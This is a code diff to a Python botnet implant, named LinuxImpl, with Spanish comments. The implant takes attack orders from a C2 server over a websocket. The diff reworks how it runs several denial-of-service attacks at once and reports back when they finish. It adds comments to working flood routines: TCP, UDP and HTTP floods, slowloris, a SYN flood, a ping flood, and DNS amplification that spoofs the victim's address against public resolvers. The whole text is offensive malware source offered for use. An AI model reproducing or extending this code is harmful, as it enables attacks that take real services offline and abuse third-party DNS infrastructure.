@@ -28,8 +28,8 @@ class LinuxImpl:
         self.upload_buffer = []
         self.upload_destination = None
         self.running = True
-        self.active_attack = False
         self.attack_thread = None
+        self.attacks=[]
         
         # Configurar manejador de señales
         signal.signal(signal.SIGINT, self._def_handler)
@@ -225,99 +225,162 @@ class LinuxImpl:
     
     async def _handle_attack_command(self, ws, data: Dict) -> None:
         """Maneja los comandos de ataque"""
+
+        stop_thread = threading.Event()
         attack_type = data['attack']['type']
         target = data['attack']['target']
         duration = data['attack'].get('duration', 60)
-        
-        # Detener cualquier ataque previo
-        if self.active_attack:
-            await self._stop_attack(ws)
-        
-        # Iniciar nuevo ataque
-        self.active_attack = True
-        self.attack_thread = threading.Thread(
-            target=self._execute_attack,
-            args=(str(attack_type), str(target), int(duration), ws),
-            daemon=True
-        )
-        self.attack_thread.start()
-        
-        await ws.send(json.dumps({
-            "status": "attack_started",
-            "attack_type": attack_type,
-            "target": target,
-            "duration": duration
-        }))
+
+
+        if len(self.attacks) == 0:
+            
+            loop = asyncio.get_event_loop()
+            
+            # Iniciar nuevo ataque
+            
+            attack_thread = threading.Thread(
+                target=self._execute_attack,
+                args=(str(attack_type), str(target), int(duration), ws, loop, stop_thread),
+                daemon=True
+            )
+            attack_thread.start()
+
+            self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})
+
+            
+            await ws.send(json.dumps({
+                "status": "attack_running",
+                "attack_type": attack_type,
+                "target": target
+            }))
+        else:
+            for attack in self.attacks:
+                print("loop")
+                if attack_type == attack['type']:
+                    print(f"already running {attack_type} {attack['type']}")
+                else:
+                    
+                    # Obtener el bucle de eventos actual
+                    loop = asyncio.get_event_loop()
+                    
+                    # Iniciar nuevo ataque
+                    
+                    attack_thread = threading.Thread(
+                        target=self._execute_attack,
+                        args=(str(attack_type), str(target), int(duration), ws, loop, stop_thread),
+                        daemon=True
+                    )
+                    attack_thread.start()
+
+                    self.attacks.append({"type":attack_type, "thread": attack_thread, "stop_thread":stop_thread, "target":target, "loop":loop})
+
+
+                    await ws.send(json.dumps({
+                        "status": "attack_running",
+                        "attack_type": attack_type,
+                        "target": target
+                    }))
+
+                return
     
-    def _execute_attack(self, attack_type: str, target: str, duration: int, ws) -> None:
+    def _execute_attack(self, attack_type: str, target: str, duration: int, ws, loop, stop_thread) -> None:
+
         """Ejecuta el ataque en un hilo separado"""
         end_time = time.time() + duration
         
         try:
             if attack_type == "tcp_flood":
-                self._tcp_flood_attack(target, end_time)
+                self._tcp_flood_attack(target, end_time, stop_thread)
             elif attack_type == "udp_flood":
-                self._udp_flood_attack(target, end_time)
+                self._udp_flood_attack(target, end_time, stop_thread)
             elif attack_type == "http_flood":
-                self._http_flood_attack(target, end_time)
+                self._http_flood_attack(target, end_time, stop_thread)
             elif attack_type == "slowloris":
-                self._slowloris_attack(target, end_time)
+                self._slowloris_attack(target, end_time, stop_thread)
             elif attack_type == "syn_flood":
-                self._syn_flood_attack(target, end_time)
+                self._syn_flood_attack(target, end_time, stop_thread)
             elif attack_type == "icmp_flood":
-                self._icmp_flood_attack(target, end_time)
+                self._icmp_flood_attack(target, end_time, stop_thread)
             elif attack_type == "dns_amplification":
-                self._dns_amplification_attack(target, end_time)
+                self._dns_amplification_attack(target, end_time, stop_thread)
             else:
                 print(f"[!] Tipo de ataque no reconocido: {attack_type}")
         except Exception as e:
             print(f"[!] Error en el ataque: {e}")
         finally:
-            self.active_attack = False
+            # Notificar que el ataque ha terminado
+            asyncio.run_coroutine_threadsafe(
+                self._notify_attack_completed(ws, attack_type, target),
+                loop
+            )
+
+
+        
+    async def _notify_attack_completed(self, ws, attack_type: str, target: str) -> None:
+        """Notifica al C2 que el ataque ha terminado"""
+        try:
+            await ws.send(json.dumps({
+                "status": "attack_completed",
+                "attack_type": attack_type,
+                "target": target,
+                "message": "Ataque completado"
+            }))
+        except Exception as e:
+            print(f"[!] Error notificando finalización del ataque: {e}")
+
+
     
-    def _tcp_flood_attack(self, target: str, end_time: float) -> None:
+    def _tcp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
         """Ataque de inundación TCP"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
-        while time.time() < end_time and self.active_attack:
+        print(f"[*] Iniciando tcp Flood a {target}")
+        while time.time() < end_time and not stop_thread.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(1)
                 s.connect((target_ip, target_port))
                 s.send(random._urandom(1024))
                 s.close()
+
             except:
                 pass
     
-    def _udp_flood_attack(self, target: str, end_time: float) -> None:
+    def _udp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
         """Ataque de inundación UDP"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
-        while time.time() < end_time and self.active_attack:
+        print(f"[*] Iniciando udp Flood a {target}")
+        while time.time() < end_time and not stop_thread.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.sendto(random._urandom(1024), (target_ip, target_port))
                 s.close()
+
             except:
                 pass
     
-    def _http_flood_attack(self, target: str, end_time: float) -> None:
+    def _http_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
+
         """Ataque de inundación HTTP"""
         import urllib.request
-        
+        # 1. Verificar formato del target
         if not target.startswith(('http://', 'https://')):
-            target = 'http://' + target
+            target = 'http://' + target  # Asumir HTTP si no se especifica
         
-        socket.setdefaulttimeout(5)
+        # 2. Configurar timeout para no bloquear el ataque
+        socket.setdefaulttimeout(5)  # 5 segundos
         
+        # 3. Headers básicos para evitar bloqueos
         headers = {
             'User-Agent': 'Mozilla/5.0',
             'Accept': '*/*',
-            'Connection': 'close'
+            'Connection': 'close'  # No mantener conexiones vivas
         }
         
+        # 4. Preparar la solicitud
         request = urllib.request.Request(
             url=target,
             headers=headers,
@@ -326,28 +389,35 @@ class LinuxImpl:
         
         print(f"[*] Iniciando HTTP Flood a {target}")
         
-        while time.time() < end_time and self.active_attack:
+        # 5. Bucle principal de ataque
+        while time.time() < end_time and not stop_thread.is_set():
             try:
+                # 6. Enviar petición y leer algo de respuesta
                 with urllib.request.urlopen(request) as response:
-                    response.read(64)
+                    response.read(64)  # Leer mínimo para consumir recursos
+                
+                # 7. Pequeña pausa para evitar saturación local
                 time.sleep(0.01)
+                
             except urllib.error.URLError as e:
                 print(f"[!] Error de URL: {e.reason}")
                 break
             except Exception as e:
                 print(f"[!] Error: {str(e)}")
-                time.sleep(1)
+                time.sleep(1)  # Esperar antes de reintentar
         
         print("[*] Ataque HTTP Flood finalizado")
     
-    def _slowloris_attack(self, target: str, end_time: float) -> None:
+
+    
+    def _slowloris_attack(self, target: str, end_time: float, stop_thread) -> None:
         """Ataque Slowloris (mantiene conexiones HTTP abiertas)"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         sockets = []
         
         try:
-            while time.time() < end_time and self.active_attack:
+            while time.time() < end_time and not stop_thread.is_set(): 
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.connect((target_ip, target_port))
@@ -370,39 +440,43 @@ class LinuxImpl:
         finally:
             self._close_sockets(sockets)
     
-    def _syn_flood_attack(self, target: str, end_time: float) -> None:
-        """Ataque SYN flood (requiere permisos root)"""
+    def _syn_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
+        """Ataque SYN flood"""
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
-        while time.time() < end_time and self.active_attack:
+        while time.time() < end_time and not stop_thread.is_set():
             try:
-                # Crear socket raw requiere permisos de root
+                # Crear socket raw requiere permisos de administrador
                 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 
-                # Paquete SYN simplificado
+                # Paquete SYN simplificado (en realidad necesitarías construir los headers correctamente)
                 packet = b'\x00' * 64  # Placeholder
                 s.sendto(packet, (target_ip, target_port))
                 s.close()
             except:
                 pass
     
-    def _icmp_flood_attack(self, target: str, end_time: float) -> None:
-        """Ataque ICMP (Ping) flood (requiere permisos root)"""
-        while time.time() < end_time and self.active_attack:
+    def _icmp_flood_attack(self, target: str, end_time: float, stop_thread) -> None:
+        """Ataque ICMP (Ping) flood"""
+        import os
+        
+        while time.time() < end_time and not stop_thread.is_set():
             try:
-                subprocess.run(["ping", "-c", "1", "-s", "65500", target], 
-                              stdout=subprocess.DEVNULL, 
-                              stderr=subprocess.DEVNULL)
+                if os.name == 'nt':
+                    os.system(f"ping -n 1 -l 65500 {target} > nul")
             except:
                 pass
     
-    def _dns_amplification_attack(self, target: str, end_time: float) -> None:
-        """Ataque de amplificación DNS con IP spoofing (requiere permisos root)"""
+
+    def _dns_amplification_attack(self, target: str, end_time: float, stop_thread) -> None:
+        """Ataque de amplificación DNS con IP spoofing"""
+        # Lista de servidores DNS abiertos (considera usar una lista más grande)
         dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
         target_ip = target.split(":")[0]
         
+        # Dominios con respuestas grandes para mayor amplificación
         large_domains = [
             "example.com", 
             "isc.org", 
@@ -411,21 +485,28 @@ class LinuxImpl:
             "microsoft.com"
         ]
         
-        while time.time() < end_time and self.active_attack:
+        while time.time() < end_time and not stop_thread.is_set():
             try:
                 for dns_server in dns_servers:
+                    # Seleccionar un dominio aleatorio
                     domain = random.choice(large_domains)
                     
+                    # Crear paquete DNS con Scapy para mayor control
+                    # Usamos tipo ANY (255) o TXT para respuestas más grandes
                     dns_query = IP(dst=dns_server, src=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(
                         rd=1,
                         qd=DNSQR(qname=domain, qtype="ANY")
                     )
                     
+                    # Enviar el paquete con IP falsificada
                     send(dns_query, verbose=0)
+                    
+                    # Pequeña pausa para evitar saturación local
                     time.sleep(0.01)
                     
             except Exception as e:
                 pass
+
 
     def _close_sockets(self, sockets: list) -> None:
         """Cierra todos los sockets en la lista"""
@@ -435,17 +516,33 @@ class LinuxImpl:
             except:
                 pass
     
-    async def _stop_attack(self, ws) -> None:
+    async def _stop_attack(self, ws, attack_type) -> None:
+
         """Detiene cualquier ataque en curso"""
-        self.active_attack = False
-        
-        if self.attack_thread and self.attack_thread.is_alive():
-            self.attack_thread.join(timeout=1)
-        
-        await ws.send(json.dumps({
-            "status": "attack_stopped",
-            "message": "Ataque detenido correctamente"
-        }))
+
+        if len(attack_type) == 0:
+            for attack in self.attacks[:]:
+                #if attack['thread'].is_alive():
+                attack['stop_thread'].set()
+                attack['thread'].join(timeout=5)
+                asyncio.run_coroutine_threadsafe(
+                    self._notify_attack_completed(ws, attack_type, attack['target']),
+                    attack['loop']
+                )
+                self.attacks.remove(attack)
+
+        else:
+            for attack in self.attacks:
+                if attack['type'] == attack_type:
+                    if attack['thread'].is_alive():
+                        attack['stop_thread'].set()
+                        attack['thread'].join(timeout=5)
+                    self.attacks.remove(attack)
+                    asyncio.run_coroutine_threadsafe(
+                        self._notify_attack_completed(ws, attack_type, attack['target']),
+                        attack['loop']
+                    )
+
     
     async def register(self) -> None:
         """Registra el implante con el servidor C2"""
@@ -536,7 +633,6 @@ class LinuxImpl:
         """Manejador de señales para salida limpia"""
         print("\n\n[!] Saliendo..\n")
         self.running = False
-        self.active_attack = False
         sys.exit(1)
 
 if __name__ == "__main__":
